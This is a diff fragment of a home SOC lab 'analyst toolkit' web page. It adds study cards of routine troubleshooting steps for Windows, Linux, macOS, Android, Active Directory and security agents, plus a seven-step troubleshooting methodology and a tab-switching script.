+          <div class="study-item"><span class="port-num">DNS Fix</span><span class="port-desc">CMD as Admin: ipconfig /flushdns clears cached DNS entries. If DNS still broken: Change adapter DNS to 8.8.8.8 manually via Network Settings → Adapter Properties → IPv4 → Use following DNS.</span></div>
+          <div class="study-item"><span class="port-num">Agent Not Showing</span><span class="port-desc">Huntress/security agent not appearing in dashboard: 1) services.msc — is agent service running? 2) Check AV quarantine for agent files. 3) Add AV exclusions for agent folder. 4) Test-NetConnection to cloud endpoint on required port.</span></div>
+        </div>
+
+        <div class="study-card">
+          <div class="study-card-title">🐧 Linux Troubleshooting</div>
+          <div class="study-item"><span class="port-num">No Internet</span><span class="port-desc">Check IP: ip addr show. No IP = run: sudo dhclient eth0. Check routing: ip route show — should show default gateway. Test gateway: ping [gateway IP]. Check DNS: cat /etc/resolv.conf — should show nameserver entry.</span></div>
+          <div class="study-item"><span class="port-num">Service Down</span><span class="port-desc">Check status: systemctl status servicename. Start it: sudo systemctl start servicename. Enable on boot: sudo systemctl enable servicename. View logs: journalctl -u servicename -n 50 for last 50 log entries.</span></div>
+          <div class="study-item"><span class="port-num">Permission Denied</span><span class="port-desc">Add sudo before command. If still denied check file permissions: ls -la filename. Change ownership: sudo chown user:group filename. Change permissions: sudo chmod 755 filename. Check if user is in correct group: id username.</span></div>
+          <div class="study-item"><span class="port-num">Disk Full</span><span class="port-desc">Check space: df -h. Find large files: sudo du -sh /* | sort -rh | head 10. Clear logs: sudo journalctl --vacuum-size=100M. For Splunk specifically clear old indexes or increase disk allocation in VMware.</span></div>
+          <div class="study-item"><span class="port-num">SSH Fails</span><span class="port-desc">Test connectivity: ping [target IP]. Check SSH service: systemctl status ssh. Verify port 22 open: nmap -p 22 [target]. Check firewall: sudo ufw status. Verify credentials and that user exists on target system.</span></div>
+          <div class="study-item"><span class="port-num">Splunk Down</span><span class="port-desc">Check status: sudo /opt/splunk/bin/splunk status. Start: sudo /opt/splunk/bin/splunk start. Check logs: tail -50 /opt/splunk/var/log/splunk/splunkd.log. Verify ports: ss -tulpn | grep -E "8000|9997".</span></div>
+          <div class="study-item"><span class="port-num">Package Won't Install</span><span class="port-desc">Update repos first: sudo apt update. If dependency error: sudo apt install -f to fix broken dependencies. If GPG error: sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys [KEY]. Check internet connectivity first.</span></div>
+        </div>
+
+        <div class="study-card">
+          <div class="study-card-title">🍎 macOS Troubleshooting</div>
+          <div class="study-item"><span class="port-num">No Internet</span><span class="port-desc">System Settings → Network → select interface → Renew DHCP Lease. Terminal: sudo dscacheutil -flushcache && sudo killall -HUP mDNSResponder to flush DNS. Turn WiFi off and on. Check router connectivity from another device.</span></div>
+          <div class="study-item"><span class="port-num">Slow Mac</span><span class="port-desc">Open Activity Monitor (Applications → Utilities). Check CPU and Memory tabs. Identify top process. Spinning beach ball = system overloaded. Check for runaway processes — force quit if unresponsive. Check storage: About This Mac → Storage.</span></div>
+          <div class="study-item"><span class="port-num">App Won't Open</span><span class="port-desc">Right click app → Open (bypasses Gatekeeper for first run). If blocked by security: System Settings → Privacy & Security → Allow app. Check Console app for crash logs. Delete app preferences: ~/Library/Preferences/[app.plist].</span></div>
+          <div class="study-item"><span class="port-num">Gatekeeper Block</span><span class="port-desc">macOS security feature blocks unsigned apps. Fix: System Settings → Privacy & Security → scroll down → click Open Anyway next to blocked app. Or Terminal: sudo spctl --master-disable (disables Gatekeeper entirely — use cautiously).</span></div>
+          <div class="study-item"><span class="port-num">Agent Install Fails</span><span class="port-desc">Check System Settings → Privacy & Security → Full Disk Access — add agent. Check Privacy & Security → Accessibility — add agent. macOS requires explicit permission grants for security software. SIP may need consideration for kernel extensions.</span></div>
+          <div class="study-item"><span class="port-num">Terminal Commands</span><span class="port-desc">Check IP: ifconfig en0 (WiFi) or en1 (ethernet). Ping: ping -c 4 8.8.8.8. Flush DNS: sudo dscacheutil -flushcache. Check processes: ps aux | grep processname. Restart service: sudo launchctl stop/start [service].</span></div>
+          <div class="study-item"><span class="port-num">FileVault Issues</span><span class="port-desc">Disk encryption can slow performance during first encryption. Check status: Terminal → fdesetup status. If FileVault preventing boot — use Recovery Mode (hold Cmd+R at startup) to disable or troubleshoot encryption issues.</span></div>
+        </div>
+
+        <div class="study-card">
+          <div class="study-card-title">📱 Android Troubleshooting</div>
+          <div class="study-item"><span class="port-num">No WiFi</span><span class="port-desc">Forget network and reconnect. Toggle airplane mode on and off. Check if other devices connect to same network. Settings → Network → WiFi → Advanced → check IP settings (should be DHCP not static unless intentional). Restart device.</span></div>
+          <div class="study-item"><span class="port-num">No Mobile Data</span><span class="port-desc">Settings → Network → Mobile Network → verify data enabled. Check APN settings match carrier requirements. Toggle airplane mode. Reinsert SIM card. Contact carrier if still failing — may be account or tower issue.</span></div>
+          <div class="study-item"><span class="port-num">App Issues</span><span class="port-desc">Settings → Apps → select app → Clear Cache first. If still failing → Clear Data (loses app settings). Force Stop then reopen. Uninstall and reinstall. Check storage space — low storage causes many app issues.</span></div>
+          <div class="study-item"><span class="port-num">Slow Device</span><span class="port-desc">Settings → Developer Options → Running Services to see what is consuming RAM. Clear cached data: Settings → Storage → Cached Data → Clear. Check for apps running in background. Factory reset as last resort.</span></div>
+          <div class="study-item"><span class="port-num">Security App</span><span class="port-desc">MDM or security agent issues: Settings → Device Admin Apps — verify agent has required permissions. Settings → Accessibility — check agent is enabled. Battery optimization may be killing agent — Settings → Battery → exempt agent from optimization.</span></div>
+        </div>
+
+        <div class="study-card">
+          <div class="study-card-title">🔐 Active Directory Troubleshooting</div>
+          <div class="study-item"><span class="port-num">Can't Login</span><span class="port-desc">Check account status in AD Users and Computers → find user → Properties → Account tab → is "Unlock account" checkbox visible? If yes account is locked. Check Event ID 4740 in Splunk for lockout source. Reset password if needed.</span></div>
+          <div class="study-item"><span class="port-num">GPO Not Applying</span><span class="port-desc">Run gpupdate /force on affected machine. Check gpresult /r to see which GPOs are applied. Verify machine is in correct OU. Check GPO is linked to correct OU. Verify GPO is not blocked or overridden by another policy.</span></div>
+          <div class="study-item"><span class="port-num">Domain Join Fails</span><span class="port-desc">Verify DNS points to DC: nslookup fett.local should resolve. Check DC is reachable: ping 192.168.15.44. Verify credentials have domain join permissions. Check machine name is not already in AD. Ensure time sync is correct — Kerberos fails if time differs more than 5 minutes.</span></div>
+          <div class="study-item"><span class="port-num">Replication Issues</span><span class="port-desc">CMD on DC: repadmin /showrepl to check replication status. repadmin /replsummary for summary view. dcdiag /test:replications to run diagnostics. Check Event Viewer on DC for Directory Service errors.</span></div>
+          <div class="study-item"><span class="port-num">Audit Policy</span><span class="port-desc">If Event IDs not appearing in logs: auditpol /get /category:* to check all audit settings. Enable specific category: auditpol /set /subcategory:"Security Group Management" /success:enable. Verify with gpresult /r that audit policy GPO is applied.</span></div>
+          <div class="study-item"><span class="port-num">Group Membership</span><span class="port-desc">Global group additions generate Event ID 4728. Local group = 4732. Universal group = 4756. Always check group scope in AD before searching Splunk. Verify audit policy is set to Success for Account Management category.</span></div>
+        </div>
+
+        <div class="study-card">
+          <div class="study-card-title">🛡️ Security Software Troubleshooting</div>
+          <div class="study-item"><span class="port-num">AV Conflict</span><span class="port-desc">Security agent quarantined by AV: Open AV → Quarantine → restore files → add exclusions for agent folder path. Single device = fix locally. Multiple devices = update AV policy in RMM or GPO to push exclusions to all machines simultaneously.</span></div>
+          <div class="study-item"><span class="port-num">Agent Offline</span><span class="port-desc">1) Check service is running: services.msc. 2) Check AV is not blocking agent processes. 3) Test outbound connectivity to agent cloud endpoint. 4) Check firewall rules — agent needs outbound HTTPS (443). 5) Reinstall agent if all above passes.</span></div>
+          <div class="study-item"><span class="port-num">False Positive</span><span class="port-desc">Verify file is legitimate: check publisher signature in Process Explorer, submit hash to VirusTotal, check file path (System32 = likely legit, Temp = suspicious). If confirmed safe: restore from quarantine, add exclusion, document finding. Always verify before excluding.</span></div>
+          <div class="study-item"><span class="port-num">High CPU from AV</span><span class="port-desc">AV scanning causing performance issues: Check if full scan is running (scheduled scan). Exclude development folders, build directories, and VM files from real-time scanning. These cause excessive IO without security benefit.</span></div>
+          <div class="study-item"><span class="port-num">No Alerts Firing</span><span class="port-desc">Check audit policy is enabled. Verify SIEM is receiving logs: check forwarder status on endpoint. Verify detection rules are active. Test with known safe action (create user account) and confirm Event ID appears in SIEM within 60 seconds.</span></div>
+          <div class="study-item"><span class="port-num">RMM Deployment Fails</span><span class="port-desc">Agent deployment via RMM failing: Check target machine is online. Verify RMM service account has admin rights on target. Check Windows Firewall allows RMM ports. Review RMM deployment logs for specific error. Try manual install on one machine to isolate whether issue is RMM or endpoint.</span></div>
+        </div>
+
+        <div class="study-card">
+          <div class="study-card-title">📋 Troubleshooting Methodology</div>
+          <div class="study-item"><span class="port-num">1 — Identify</span><span class="port-desc">What exactly is the problem? Get specific error messages, screenshots, Event IDs. When did it start? What changed? One device or many? Gathering this information first saves significant time and prevents guessing.</span></div>
+          <div class="study-item"><span class="port-num">2 — Scope</span><span class="port-desc">Is it isolated to one user, one machine, one site, or widespread? Scope determines urgency and approach. Widespread = infrastructure issue (DC, DNS, DHCP). Single machine = local configuration. Single user = account or profile issue.</span></div>
+          <div class="study-item"><span class="port-num">3 — Reproduce</span><span class="port-desc">Can you reproduce the issue consistently? If yes — easier to troubleshoot. If intermittent — check logs for patterns (time of day, specific user, specific action). Intermittent issues often point to resource constraints or network instability.</span></div>
+          <div class="study-item"><span class="port-num">4 — Isolate</span><span class="port-desc">Narrow down the cause. Start broad then get specific. Network issue? → which layer. Application issue? → which component. Always rule out the simplest causes first before assuming complex ones.</span></div>
+          <div class="study-item"><span class="port-num">5 — Fix</span><span class="port-desc">Apply one fix at a time. If you change multiple things simultaneously you cannot determine what actually fixed it. Document each change made. If fix does not work — revert before trying next approach.</span></div>
+          <div class="study-item"><span class="port-num">6 — Verify</span><span class="port-desc">Confirm the fix actually resolved the issue from the customer's perspective. Do not assume it is fixed — have them confirm. Check logs to verify expected behavior is restored. Monitor for recurrence.</span></div>
+          <div class="study-item"><span class="port-num">7 — Document</span><span class="port-desc">Record what the problem was, what caused it, what fixed it. This builds your knowledge base and helps teammates. Good documentation is what separates a good support analyst from a great one.</span></div>
+          <div class="study-item"><span class="port-num">Escalate</span><span class="port-desc">Know when to escalate. If issue is beyond your current scope — escalate early rather than late. Give the next tier everything you have gathered: steps tried, error messages, logs, scope. Never sit on a ticket hoping it resolves itself.</span></div>
+        </div>
+
+      </div>
+    </div>
+
+  </div>
+
   <!-- FOOTER -->
   <footer>
     <div class="footer-text">HOME SOC LAB // <span class="footer-accent">ANALYST TOOLKIT v1.0</span></div>
@@ -1230,6 +2153,14 @@
     document.querySelectorAll('.section-header[data-section]').forEach(header => {
       header.style.display = 'flex';
     });
+  }
+
+  // Study tabs
+  function showStudyTab(tab) {
+    document.querySelectorAll('.study-panel').forEach(p => p.style.display = 'none');
+    document.querySelectorAll('.study-tab').forEach(t => t.classList.remove('active-tab'));
+    document.getElementById('study-' + tab).style.display = 'block';
+    document.getElementById('tab-' + tab).classList.add('active-tab');
   }
 </script>
 </body>
